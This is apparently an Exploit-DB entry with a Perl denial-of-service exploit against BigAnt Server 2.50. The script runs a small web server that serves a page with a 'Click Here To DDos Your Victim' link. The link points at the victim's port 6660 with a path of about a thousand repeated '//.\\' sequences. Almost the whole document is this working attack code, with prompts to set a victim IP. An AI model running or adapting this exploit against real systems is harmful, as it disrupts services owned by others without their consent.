# Title: BigAnt Server version 2.50 Remote Dos Exploit
# EDB-ID: 10360
# CVE-ID: ()
# OSVDB-ID: ()
# Author: SkuLL-HacKeR
# Published: 2009-09-18
# Verified: no
# Download Exploit Code
# Download N/A

view source
print?
#!/usr/bin/perl
# BigAnt Server version 2.50 Remote Dos Exploit
# Author     : SkuLL-HacKeR
# mail       : My@hotmail.it & Wizard-skh@hotmail.com
 
use strict;
use warnings;
use IO::Socket;
my $html;
my $ipvictim = "localhost"; # change this to your ip victim !
my $portvic = 6660;
#############################
my $port_listen = 80; # change this to your desired port!
my $listenip = "127.0.0.1"; # change this to your desired IP!
print "[x] BigAnt Server version 2.50 Remote Dos Exploit\n";
print "[x] Found/Exploit by skh \n";
while(1)
{
    my $stock=new IO::Socket::INET(Listen=>1,LocalAddr => $listenip,LocalPort=>$port_listen,Proto=>'tcp');
    die unless $stock;
    print "[x] conect to your  $listenip:$port_listen \n";
    my $st;
    while($st=$stock->accept()){
        my $request = <$st>;
        print $st "HTTP/1.0 200 OK\nContent-Type: text/html\n\n";
        print "[x] Serving Exploit HTML page :)\n";
        print $st "<html>\n".
              "<head><title>Welcome to Skh Exploit!</title></head>\n".
                  "<body>\n".
                  '<h1 align="center">'.
                  '<strong>'.
                  '<a href="http://'.
                  "$ipvictim".
                  ":".
                  "$portvic".
                  "//.\\" x 1000 .
                  '">Click Here To DDos Your Victim</a>'.
                  '</strong></h1>'.
                  "</body>\n".
                  "</html>\r\n";
                sleep(0.5);
            close $st;
        print "[x] Done!\n";
    }
}
